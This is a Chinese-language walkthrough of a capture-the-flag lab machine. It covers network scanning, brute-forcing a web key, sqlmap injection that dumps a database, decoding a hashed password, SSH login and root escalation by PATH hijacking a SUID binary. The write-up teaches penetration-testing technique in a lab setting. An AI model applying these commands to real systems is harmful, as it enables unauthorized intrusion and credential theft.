```
arp-scan 192.168.207.0/24
```

```
nmap -A -sS -sV -v -p- 192.168.207.134
```

## **2、渗透测试**

### **2.1 WEB渗透**

#### **1.访问站点查看到图片**

![](../Images/47fb3c6cf60c39dc4e9abcc98adb0fb1.png)

获取图片文件进行分析，发现一段提示内容

```
exiftool main.gif
```

![](../Images/0090caf6f51dcf430f14e194fe0d2569.png)

#### **2.访问提示页面**

根据提示访问页面后，显示输入key内容

![](../Images/76923f10d48e9e29f733b81a5942cb13.png)

使用BP结合rockyou.txt字典进行爆破，发现key密码为：elite

![](../Images/e3b83bd069dbae86668b08a9e5986087.png)

#### **3.SQLMap爆破**

访问页面后提示输入用户名

![](../Images/8e4a32cb2f5ac15a9c3978d2c4e4236f.png)

随便输入内容会进行查询

![](../Images/b50145a3caa182e6b3e1fd2e5518b4d0.png)

使用sqlmap进行爆破测试，获取到数据库信息

```
sqlmap -u "http://192.168.207.135/kzMb5nVYJw/420search.php?usrtosearch=1" --dbs --batch
```

![](../Images/916d31076975c5f7e11ef438d8d92921.png)

爆破数据内容

```
sqlmap -u "http://192.168.207.135/kzMb5nVYJw/420search.php?usrtosearch=1" -D seth --dump-all --batch
```

![](../Images/07de9f6408b68665df72d481f2600aea.png)

需要把获取到的密码进行base64解密，再使用MD5进行解密，获取到密码为：**omega**

```
echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=" | base64 -d
```

![](../Images/a4aa11219be50dec7e83699f89918fb7.png)

![](../Images/a527ab317d2acb4a808098bcc3f347c8.png)

### **2.2 主机渗透**

#### **1.通过SSH进行登录**

```
ssh ramses@192.168.1.142 -p 777
```

![](../Images/31b94892c6e3caa25c00500feea80f51.png)

#### **2.查找拥有SUID文件**

发现procwatch存在suid权限

```
find / -perm -u=s -type f 2>/dev/null
```

![](../Images/64c863fad40d38d065ed646ccb92cd63.png)

#### **3.分析文件**

执行文件后根据输出信息，发现类似于调用系统PS命令

```

cd /var/www/backup/
```

![](../Images/98123fe96ba58e7c40a61c0c69ef30a7.png)

#### **4.环境变量提权**

发现已经获取到root权限

```


echo "/bin/sh"  > ps
```

![](../Images/86439dcba0006690be24eef00df9f982.png)

#### **5.获取Flag**

